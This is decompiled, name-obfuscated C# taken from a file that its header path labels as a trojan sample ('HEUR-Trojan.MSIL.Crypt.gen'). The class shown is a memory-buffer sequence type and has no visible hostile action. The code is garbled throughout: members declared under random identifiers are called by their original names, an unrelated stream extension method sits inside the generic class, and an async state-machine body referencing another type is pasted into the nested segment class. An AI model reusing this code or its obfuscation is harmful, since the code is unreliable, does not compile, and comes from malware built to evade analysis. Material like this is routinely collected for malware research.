// Decompiled with JetBrains decompiler
// Type: 96u54o009o2511uie.83o1ao6a3o902a986
// Assembly: e52a71747iaa0aa11, Version=2.1.0.0, Culture=neutral, PublicKeyToken=cac503e1823ce71c
// MVID: 0D894068-CF68-44D1-88F9-023D8A694267
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan.MSIL.Crypt.gen-32d8b52e3461f3cf3cd3f6811df29ca82987bb597ad104f4ff2e7064dbd625ad.exe

using \u00372uu5i856ao2e600a;
using \u00396u54o009o2511uie;
using Microsoft;
using System;
using System.Buffers;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace \u00396u54o009o2511uie
{
  [DebuggerDisplay("{DebuggerDisplay,nq}")]
  public class \u00383o1ao6a3o902a986<T> : IBufferWriter<T>, IDisposable
  {
    private static readonly int \u0033o213a0907uoi746a;
    private readonly Stack<\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6> \u003103e89i649u515i76;
    private readonly MemoryPool<T> o36882o1ee6226aao;
    private readonly ArrayPool<T> \u003851007u59340u2361;
    private \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 \u0038e736e1a91u4845u2;
    private \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 \u00376745321i88a18664;

    public \u00383o1ao6a3o902a986(MemoryPool<T> memoryPool)
    {
      this.segmentPool = new Stack<\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6>();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      Requires.NotNull<MemoryPool<T>>(memoryPool, nameof (memoryPool));
      this.memoryPool = memoryPool;
    }

    public \u00383o1ao6a3o902a986(ArrayPool<T> arrayPool)
    {
      this.segmentPool = new Stack<\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6>();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      Requires.NotNull<ArrayPool<T>>(arrayPool, nameof (arrayPool));
      this.arrayPool = arrayPool;
    }

    public int \u00304o6o5e63e1i10a7e
    {
      get => this.\u003CMinimumSpanLength\u003Ek__BackingField;
      set => this.\u003CMinimumSpanLength\u003Ek__BackingField = value;
    }

    public ReadOnlySequence<T> \u00375ioi381887e70e48 => (ReadOnlySequence<T>) this;

    public long \u0031u999u6u35ea6i757 => this.\u00375ioi381887e70e48.Length;

    private string u2a44a30i6o688u16 => string.Format("Length: {0}", (object) this.\u00375ioi381887e70e48.Length);

    public static implicit operator ReadOnlySequence<T>(
      \u00383o1ao6a3o902a986<T> sequence)
    {
      return sequence.first == null ? ReadOnlySequence<T>.Empty : new ReadOnlySequence<T>((ReadOnlySequenceSegment<T>) sequence.first, sequence.first.Start, (ReadOnlySequenceSegment<T>) sequence.last, sequence.last.\u00378ea777e595a008ie);
    }

    public void \u0031o261i04i69419396(SequencePosition _param1)
    {
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 next = (\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6) ((SequencePosition) ref _param1).GetObject();
      int integer = ((SequencePosition) ref _param1).GetInteger();
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 first = this.first;
      while (first != next && first != null)
        first = first.\u003338ee58ai8o52u914;
      Requires.Argument(first != null, "position", "Position does not represent a valid position in this sequence.");
      Requires.Argument(integer >= first.Start, "position", "Position must not be earlier than current position.");
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 u91e48oii585aiee6 = this.first;
      while (u91e48oii585aiee6 != next)
        u91e48oii585aiee6 = this.RecycleAndGetNext(u91e48oii585aiee6);
      next.AdvanceTo(integer);
      if (next.e340o822266730191 == 0)
        next = this.RecycleAndGetNext(next);
      this.first = next;
      if (this.first != null)
        return;
      this.last = (\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6) null;
    }

    public void \u00385e67u71590954uae(int ei56u9796ia852uu3)
    {
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 last = this.last;
      Verify.Operation(last != null, "Cannot advance before acquiring memory.");
      last.Advance(ei56u9796ia852uu3);
    }

    public Memory<T> e455a8e4ue0au7865(int a6051e8o7a6521a19) => this.GetSegment(a6051e8o7a6521a19).a7ouu85o22913171e;

    public Span<T> \u0034o3u371e6o671i6e9(int i92a9i199o8oi8o16) => this.GetSegment(i92a9i199o8oi8o16).\u0034972898ei19ii4e5o;

    [EditorBrowsable(EditorBrowsableState.Never)]
    public void ea2iuuuo11o8e5032() => this.Reset();

    public void \u0033ia3u940ao28u482u()
    {
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 u91e48oii585aiee6 = this.first;
      while (u91e48oii585aiee6 != null)
        u91e48oii585aiee6 = this.RecycleAndGetNext(u91e48oii585aiee6);
      this.first = this.last = (\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6) null;
    }

    private \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 \u00317o535i88oa509272(
      int _param1)
    {
      Requires.Range(_param1 >= 0, "sizeHint", (string) null);
      int? nullable = new int?();
      if (_param1 == 0)
      {
        if (this.last == null || this.last.\u0037i16u1e457239e78e == 0)
          nullable = new int?(-1);
      }
      else
      {
        _param1 = Math.Max(this.\u00304o6o5e63e1i10a7e, _param1);
        if (this.last == null || this.last.\u0037i16u1e457239e78e < _param1)
          nullable = new int?(_param1);
      }
      if (nullable.HasValue)
      {
        \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 u91e48oii585aiee6 = this.segmentPool.Count > 0 ? this.segmentPool.Pop() : new \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6();
        if (this.arrayPool != null)
          u91e48oii585aiee6.Assign(this.arrayPool.Rent(nullable.Value == -1 ? \u00383o1ao6a3o902a986<T>.DefaultLengthFromArrayPool : nullable.Value));
        else
          u91e48oii585aiee6.Assign(this.memoryPool.Rent(nullable.Value));
        this.Append(u91e48oii585aiee6);
      }
      return this.last;
    }

    private void \u00304i000855969645ia(
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 oo72e41742o45u4au)
    {
      if (this.last == null)
      {
        this.first = this.last = oo72e41742o45u4au;
      }
      else
      {
        if (this.last.e340o822266730191 > 0)
        {
          this.last.SetNext(oo72e41742o45u4au);
        }
        else
        {
          \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 first = this.first;
          if (this.first != this.last)
          {
            while (first.\u003338ee58ai8o52u914 != this.last)
              first = first.\u003338ee58ai8o52u914;
          }
          else
            this.first = oo72e41742o45u4au;
          first.SetNext(oo72e41742o45u4au);
          this.RecycleAndGetNext(this.last);
        }
        this.last = oo72e41742o45u4au;
      }
    }

    private \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 \u0034aai660394717a44i(
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 o8o1466a27784089a)
    {
      \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 u91e48oii585aiee6 = o8o1466a27784089a;
      o8o1466a27784089a = o8o1466a27784089a.\u003338ee58ai8o52u914;
      u91e48oii585aiee6.ResetMemory(this.arrayPool);
      this.segmentPool.Push(u91e48oii585aiee6);
      return o8o1466a27784089a;
    }

    static \u00383o1ao6a3o902a986() => \u00383o1ao6a3o902a986<T>.DefaultLengthFromArrayPool = 1 + 4095 / Marshal.SizeOf<T>();

    internal static ValueTask<int> \u00394903804o27617a16(
      this Stream ue050ee6ao884e03a,
      Memory<byte> eoeai038ao6o9u3u7,
      CancellationToken _param2 = default (CancellationToken))
    {
      Requires.NotNull<Stream>(ue050ee6ao884e03a, "stream");
      ArraySegment<byte> arraySegment;
      if (MemoryMarshal.TryGetArray<byte>(Memory<byte>.op_Implicit(eoeai038ao6o9u3u7), ref arraySegment))
        return new ValueTask<int>(ue050ee6ao884e03a.ReadAsync(arraySegment.Array, arraySegment.Offset, arraySegment.Count, _param2));
      byte[] numArray = ArrayPool<byte>.Shared.Rent(eoeai038ao6o9u3u7.Length);
      return \u0034u887740357320o46.\u00314u61oae302e2634o(ue050ee6ao884e03a.ReadAsync(numArray, 0, eoeai038ao6o9u3u7.Length, _param2), numArray, eoeai038ao6o9u3u7);
    }

    private class u91e48oii585aiee6 : ReadOnlySequenceSegment<T>
    {
      private static readonly bool a36373e7135939672;
      private T[] e20o3aaoe1i5708i2;

      internal int \u0032i987085ai81344oa
      {
        [CompilerGenerated, SpecialName] get => (^(\u00383o1ao6a3o902a986<T0>.u91e48oii585aiee6&) ref this).\u003CStart\u003Ek__BackingField;
        private set => this.\u003CStart\u003Ek__BackingField = value;
      }

      internal int \u00378ea777e595a008ie
      {
        get => this.\u003CEnd\u003Ek__BackingField;
        private set => this.\u003CEnd\u003Ek__BackingField = value;
      }

      internal Memory<T> a7ouu85o22913171e => this.\u003295o3e40o1i3850o0.Slice(this.\u00378ea777e595a008ie);

      internal Span<T> \u0034972898ei19ii4e5o => this.\u003295o3e40o1i3850o0.Span.Slice(this.\u00378ea777e595a008ie);

      internal IMemoryOwner<T> \u0037693a439601ioio80
      {
        get => this.\u003CMemoryOwner\u003Ek__BackingField;
        private set => this.\u003CMemoryOwner\u003Ek__BackingField = value;
      }

      internal Memory<T> \u003295o3e40o1i3850o0
      {
        get
        {
          T[] array = this.array;
          if (array != null)
            return Memory<T>.op_Implicit(array);
          IMemoryOwner<T> imemoryOwner = this.\u0037693a439601ioio80;
          return imemoryOwner == null ? new Memory<T>() : imemoryOwner.Memory;
        }
      }

      internal int e340o822266730191 => this.\u00378ea777e595a008ie - this.Start;

      internal int \u0037i16u1e457239e78e => this.\u003295o3e40o1i3850o0.Length - this.\u00378ea777e595a008ie;

      internal \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 \u003338ee58ai8o52u914
      {
        get => (\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6) base.Next;
        set => this.Next = (ReadOnlySequenceSegment<T>) value;
      }

      internal void \u00310ia1618a5u26a76e(IMemoryOwner<T> _param1)
      {
        this.\u0037693a439601ioio80 = _param1;
        this.Memory = Memory<T>.op_Implicit(_param1.Memory);
      }

      internal void \u003790o523o697e9482i(T[] _param1)
      {
        this.array = _param1;
        this.Memory = ReadOnlyMemory<T>.op_Implicit(_param1);
      }

      internal void \u003010i780e129ii2e8o(ArrayPool<T> _param1)
      {
        this.ClearReferences(this.Start, this.\u00378ea777e595a008ie);
        this.Memory = new ReadOnlyMemory<T>();
        this.\u003338ee58ai8o52u914 = (\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6) null;
        this.RunningIndex = 0L;
        this.\u0032i987085ai81344oa = 0;
        this.\u00378ea777e595a008ie = 0;
        if (this.array != null)
        {
          _param1.Return(this.array, false);
          this.array = (T[]) null;
        }
        else
        {
          ((IDisposable) this.\u0037693a439601ioio80)?.Dispose();
          this.\u0037693a439601ioio80 = (IMemoryOwner<T>) null;
        }
      }

      internal void \u0032945io7i137e2o247(
        \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6 _param1)
      {
        this.\u003338ee58ai8o52u914 = _param1;
        _param1.RunningIndex = this.RunningIndex + (long) this.Start + (long) this.e340o822266730191;
        this.Memory = Memory<T>.op_Implicit(this.\u003295o3e40o1i3850o0.Slice(0, this.Start + this.e340o822266730191));
      }

      internal void e9079uu054855ioi0(int eo6u3i74a41174032)
      {
        Requires.Range(eo6u3i74a41174032 >= 0 && this.\u00378ea777e595a008ie + eo6u3i74a41174032 <= this.Memory.Length, "count", (string) null);
        this.\u00378ea777e595a008ie += eo6u3i74a41174032;
      }

      internal void \u0034a328ooe1oe7963e7(int _param1)
      {
        this.ClearReferences(this.Start, _param1 - this.Start);
        this.\u0032i987085ai81344oa = _param1;
      }

      private void a5ua1o81919e1572o(int ae105iu66oii2a8ei, int _param2)
      {
        if (\u00383o1ao6a3o902a986<T>.u91e48oii585aiee6.IsValueTypeElement)
          return;
        this.\u003295o3e40o1i3850o0.Span.Slice(ae105iu66oii2a8ei, _param2).Fill(default (T));
      }

      static u91e48oii585aiee6() => \u00383o1ao6a3o902a986<T>.u91e48oii585aiee6.IsValueTypeElement = typeof (T).GetTypeInfo().IsValueType;

      private void \u0030a031u5ee61iu6ai4()
      {
        // ISSUE: reference to a compiler-generated field
        int num1 = ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u0034393oi238676372ea;
        int num2;
        try
        {
          try
          {
            ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter awaiter;
            if (num1 != 0)
            {
              // ISSUE: reference to a compiler-generated field
              awaiter = ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).i0i5aoi2a46346e3u.ConfigureAwait(false).GetAwaiter();
              if (!awaiter.IsCompleted)
              {
                // ISSUE: reference to a compiler-generated field
                ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u0034393oi238676372ea = num1 = 0;
                // ISSUE: reference to a compiler-generated field
                ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u003841458a4ou0uai307 = awaiter;
                // ISSUE: reference to a compiler-generated field
                // ISSUE: cast to a reference type
                ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).u03668a8210o64o6i.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter, \u0034u887740357320o46.\u00310i2672211070oe3a>(ref awaiter, (\u0034u887740357320o46.\u00310i2672211070oe3a&) this);
                return;
              }
            }
            else
            {
              // ISSUE: reference to a compiler-generated field
              awaiter = ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u003841458a4ou0uai307;
              // ISSUE: reference to a compiler-generated field
              ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u003841458a4ou0uai307 = new ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter();
              // ISSUE: reference to a compiler-generated field
              ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u0034393oi238676372ea = num1 = -1;
            }
            int result = awaiter.GetResult();
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            new Span<byte>(((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u00315i8084eue7a96eio, 0, result).CopyTo(((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u00385u1o6129i0a36657.Span);
            num2 = result;
          }
          finally
          {
            if (num1 < 0)
            {
              // ISSUE: reference to a compiler-generated field
              ArrayPool<byte>.Shared.Return(((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u00315i8084eue7a96eio, false);
            }
          }
        }
        catch (Exception ex)
        {
          // ISSUE: reference to a compiler-generated field
          ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u0034393oi238676372ea = -2;
          // ISSUE: reference to a compiler-generated field
          ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).u03668a8210o64o6i.SetException(ex);
          return;
        }
        // ISSUE: reference to a compiler-generated field
        ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).\u0034393oi238676372ea = -2;
        // ISSUE: reference to a compiler-generated field
        ((\u0034u887740357320o46.\u00310i2672211070oe3a) this).u03668a8210o64o6i.SetResult(num2);
      }
    }
  }
}
